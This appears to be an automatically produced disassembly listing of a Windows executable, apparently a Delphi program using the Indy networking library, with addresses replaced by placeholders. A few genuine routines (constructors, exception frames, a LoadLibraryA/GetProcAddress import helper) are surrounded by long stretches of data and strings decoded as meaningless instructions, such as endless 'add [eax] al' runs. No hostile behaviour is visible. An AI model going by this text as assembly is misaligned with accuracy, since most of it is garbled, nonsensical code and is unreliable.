add [ eax ] al
mov al 0x46
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
adc al 0xb5
inc esi
add [ eax ] al
add [ eax ] al
test [ ebp + 0x46 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ ebp + 0xc0046 ] dh
add [ eax ] al
mov al 0x46
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
and al 0x45
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
push ebp
outsb
jb r-xdata
jb r-xdata
jb r-xdata
imul esi [ ebx + 0x73 ] 0x456e6f69
inc ebp
jb r-xdata
or al 0xb3
inc esi
add [ eax ] al
mov eax eax
outsd
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi * 4 + 0xc0046 ] ah
add [ eax ] al
mov al 0x46
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
and [ ebp + 0x49 ] eax
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
push esp
jb r-xdata
jbe r-xdata
popad
arpl [ eax + 0x61 ] bp
bound ebp [ ebp + 0x45 ]
jb r-xdata
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
and al [ ebp + 0x49 ]
je r-xdata
jb r-xdata
popad
jb r-xdata
inc ebp
jb r-xdata
xchg esp eax
xor eax [ eax ]
cwde
xor eax [ eax ]
outsd
jae r-xdata
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
cmp [ esi + eax * 2 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
mov ah 0x46
add [ eax + eax ] cl
add [ eax ] al
mov al 0x46
outsd
jb r-xdata
imul esi [ edx + 0x65 ] 0x72724564
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
sbb eax 0x53644945
outsd
outsb
outsb
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
add [ 0x53644945 ] bl
jb r-xdata
outsd
jb r-xdata
outsd
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
or [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ edx ] ah
inc ebp
dec ecx
outsb
shl [ esi + esi * 4 + 0x46 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov dh 0x46
add [ eax + eax ] cl
add [ eax ] al
mov al 0x46
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
sbb al [ ebp + 0x49 ]
mov dh 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 4 + 0x46 ] ah
outsb
push edx
jne r-xdata
outsd
inc ebp
jb r-xdata
int3
jb r-xdata
jb r-xdata
nop
inc eax
add al bh
mov ch 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
mov ch 0x46
add [ eax + eax ] cl
add [ eax ] al
mov al 0x46
nop
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 4 ] dh
inc esi
add [ eax + eax ] cl
add [ eax ] al
xchg esp eax
lodsb [ esi ]
inc esi
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
adc [ ebp + 0x49 ] al
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
or [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ edx ] bl
inc ebp
dec ecx
push esp
dec esp
inc ebp
js r-xdata
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
insb
imul esp [ ebx + edx * 2 + 0x6f ] 0x74656b63
add [ eax - 0x73ffbfcd ] bl
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ edx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
outsd
insd
insd
popad
pop ebx
pop ebp
retn 0x4
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
mov eax edi
test bl bl
je r-xdata
outsd
jb r-xdata
xor eax [ eax ]
cwde
xor eax [ eax ]
jb r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
outsb
jbe r-xdata
dec ecx
lea eax [ eax ]
xchg esp eax
mov bh 0x46
add [ eax ] al
add [ eax ] al
jae r-xdata
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x100046b7 ] bl
add [ eax ] al
add [ esp + ebp * 4 + 0x33840046 ] dl
inc eax
add [ eax - 0x6bffbfcd ] dl
xor eax [ eax ]
cwde
xor eax [ eax ]
outsd
jb r-xdata
outsb
inc ebp
xor al 0xb7
inc esi
add [ eax ] al
add [ eax ] al
sub_46b785
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add al dh
mov bh 0x46
add [ esi ] cl
inc ebp
dec ecx
push ebx
pop ebx
pop ebp
retn 0x4
jb r-xdata
mov eax edi
test bl bl
je r-xdata
outsd
jb r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
dec ecx
outsb
jbe r-xdata
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
insb
imul esp [ ebx + edx * 2 + 0x6f ] 0x74656b63
lea eax [ eax ]
xchg esp eax
mov bh 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x100046b7 ] bl
add [ eax ] al
add [ esp + ebp * 4 + 0x33840046 ] dl
inc eax
add [ eax - 0x6bffbfcd ] dl
xor eax [ eax ]
cwde
xor eax [ eax ]
sub_46b7a8
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax edi
call sub_40b6a8
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_46b7f0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax edi
call sub_40b6a8
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_46b838
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46b85d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b864
retn
sub_46b870
xchg esi eax
dec eax
add cl dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dl dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bl dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ah dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ch dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dh dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bh dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add al bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add cl bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dl bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bl bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ah bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ch bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dh bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bh bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add al ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add cl ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dl ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bl ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ah ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ch ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dh ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bh ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add al ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add cl ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dl ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bl ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ah ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ch ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dh ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bh ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add al dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add cl dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dl dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bl dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ah dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ch dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dh dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bh dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add al bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add cl bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dl bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bl bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ah bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ch bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dh bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bh bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add al al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add cl al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dl al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bl al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ah al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ch al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dh al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bh al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add al cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add cl cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dl cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bl cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ah cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ch cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dh cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bh cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ eax + 0x640000fe ] dh
xchg esi eax
dec eax
add [ ecx + 0x640000fe ] dh
xchg esi eax
dec eax
add [ edx + 0x640000fe ] dh
xchg esi eax
dec eax
add [ ebx + 0x640000fe ] dh
xchg esi eax
dec eax
add [ esi + edi * 8 - 0x699c0000 ] dh
dec eax
add [ ebp + 0x640000fe ] dh
xchg esi eax
dec eax
add [ esi + 0x640000fe ] dh
xchg esi eax
dec eax
add [ edi + 0x640000fe ] dh
xchg esi eax
dec eax
add [ eax + 0x640000fe ] bh
xchg esi eax
dec eax
add [ ecx + 0x640000fe ] bh
xchg esi eax
dec eax
add [ edx + 0x640000fe ] bh
xchg esi eax
dec eax
add [ ebx + 0x640000fe ] bh
xchg esi eax
dec eax
add [ esi + edi * 8 - 0x699c0000 ] bh
dec eax
add [ ebp + 0x640000fe ] bh
xchg esi eax
dec eax
add [ esi + 0x640000fe ] bh
xchg esi eax
dec eax
add [ edi + 0x640000fe ] bh
xchg esi eax
dec eax
add [ eax + 0x640000fe ] ah
xchg esi eax
dec eax
add [ ecx + 0x640000fe ] ah
xchg esi eax
dec eax
add [ edx + 0x640000fe ] ah
xchg esi eax
dec eax
add [ ebx + 0x640000fe ] ah
xchg esi eax
dec eax
add [ esi + edi * 8 - 0x699c0000 ] ah
dec eax
add [ ebp + 0x640000fe ] ah
xchg esi eax
dec eax
add [ esi + 0x640000fe ] ah
xchg esi eax
dec eax
add [ edi + 0x640000fe ] ah
xchg esi eax
dec eax
add [ eax + 0x640000fe ] ch
xchg esi eax
dec eax
add [ ecx + 0x550000fe ] ch
mov ebp esp
xor eax eax
push ebp
push sub_46bb5d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bb64
retn
sub_46bbe8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_46bc88
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x14 ]
mov edx edi
call sub_403fa4
mov [ ebx + 0xc ] esi
test esi esi
jne r-xdata
add esp 0xfffffff0
call sub_4034a0
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_40aea0
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x10 ]
call sub_403fa4
push edi
push r-xdata
push [ ebx + 0x10 ]
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_4042d0
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax ebx
call sub_40b6a8
mov ecx edi
xor edx edx
mov eax ebx
call sub_40b6a8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bc8f
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403f74
retn
sub_46bc8f
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_46ca6c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_46cb0f
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ eax + eax * 2 ]
lea ebx [ eax * 4 + rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
mov eax [ ebx + 0x4 ]
mov [ eax ] esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cb16
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f74
retn
push 0x276d
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c80
mov eax [ ebp - 0x8 ]
mov edx [ ebx + 0x8 ]
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] 0x6
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_408df4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_46bbe8
call sub_403908
sub_46cb20
push ebx
xor eax eax
mov [ rw-data ] eax
mov ecx 0x70
mov eax rw-data
mov edx eax
mov ebx [ edx + 0x4 ]
mov edx [ edx ]
mov [ ebx ] edx
add eax 0xc
dec ecx
jne r-xdata
pop ebx
retn
sub_46cb44
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46cc11
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
push eax
mov ax [ ebp + 0x8 ]
push eax
call [ rw-data ]
mov ebx eax
jmp r-xdata
call GetLastError
push eax
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c80
mov eax [ ebp - 0x8 ]
push eax
mov eax r-xdata
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
pop eax
call sub_408df4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_46bbe8
call sub_403908
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cc18
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f74
retn
sub_46cc4f
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_46cc7c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cc83
retn
call sub_46bcc0
sub_46cc98
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46ccbd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ccc4
retn
sub_46ccd0
sbb al 0xcd
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx * 8 + 0x40046 ] ch
add [ eax ] al
mov al 0x10
inc eax
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
dec eax
sub [ eax ] eax
dec eax
sub [ eax ] eax
dec eax
sub [ eax ] eax
dec eax
sub [ eax ] eax
or eax 0x53644954
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax ] ch
salc
inc esi
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + edx * 8 + 0x46 ] dh
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax ] bl
rol [ esi ] 0x1
dec eax
sub [ eax ] eax
imul esi [ ebx + 0x74 ] 0xcd88c08b
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ecx * 8 ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] bl
into
inc esi
add [ eax ] dl
add [ eax ] al
add [ eax - 0x7bffbff0 ] dh
xor eax [ eax ]
nop
xor eax [ eax ]
xchg esp eax
xor eax [ eax ]
cwde
xor eax [ eax ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
into
inc esi
add [ eax + eax ] cl
add [ eax ] al
sub dh cl
inc esi
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
sbb al 0x45
dec ecx
push ebx
je r-xdata
arpl [ ebx - 0x70 ] bp
je r-xdata
inc esp
xor [ eax ] eax
pop ss
inc ebp
dec ecx
push ebx
je r-xdata
arpl [ ebx + 0x49 ] bp
outsb
imul esi [ ecx + ebp * 2 + 0x61 ] 0x617a696c
je r-xdata
dec eax
sub [ eax ] eax
dec eax
sub [ eax ] eax
dec eax
sub [ eax ] eax
dec eax
sub [ eax ] eax
dec eax
sub [ eax ] eax
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x80040 ] dl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ecx * 8 + 0x46 ] dh
add [ eax + eax ] cl
add [ eax ] al
xchg esp eax
lodsb [ esi ]
inc esi
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
or eax 0x53644945
je r-xdata
retn 0x4
arpl [ ebx + 0x53 ] bp
je r-xdata
arpl [ ebp + 0x65 ] sp
push 0xffffffff
outsd
outsb
je r-xdata
arpl [ ebx + 0x45 ] bp
jb r-xdata
add [ eax ] al
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
lea ecx [ esp + 0x4 ]
call sub_46cf60
retn
imul edi [ edx + 0x65 ] 0x65637845
push 0xffffffff
je r-xdata
inc esi
popad
imul ebp [ ebp + 0x64 ] 0x3c00408d
iretd
popad
insb
imul edi [ edx + 0x61 ] 0x6e6f6974
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ecx * 8 ] bh
inc esi
add [ eax + eax ] cl
add [ eax ] al
sub dh cl
inc esi
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
outsd
jb r-xdata
add [ eax ] al
or [ ecx + ecx * 2 + 0x64 ] dl
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ eax ] al
rcl al 0xce
sub_46cd79
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ eax ] ch
salc
inc esi
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + edx * 8 + 0x46 ] dh
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax ] bl
rol [ esi ] 0x1
dec eax
sub [ eax ] eax
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
into
inc esi
add [ eax + eax ] cl
add [ eax ] al
sub dh cl
inc esi
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
sbb al 0x45
dec ecx
push ebx
je r-xdata
arpl [ ebx - 0x70 ] bp
je r-xdata
inc esp
xor [ eax ] eax
pop ss
inc ebp
dec ecx
push ebx
je r-xdata
arpl [ ebx + 0x49 ] bp
outsb
imul esi [ ecx + ebp * 2 + 0x61 ] 0x617a696c
je r-xdata
dec eax
sub [ eax ] eax
dec eax
sub [ eax ] eax
dec eax
sub [ eax ] eax
dec eax
sub [ eax ] eax
dec eax
sub [ eax ] eax
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x80040 ] dl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ecx * 8 + 0x46 ] dh
add [ eax + eax ] cl
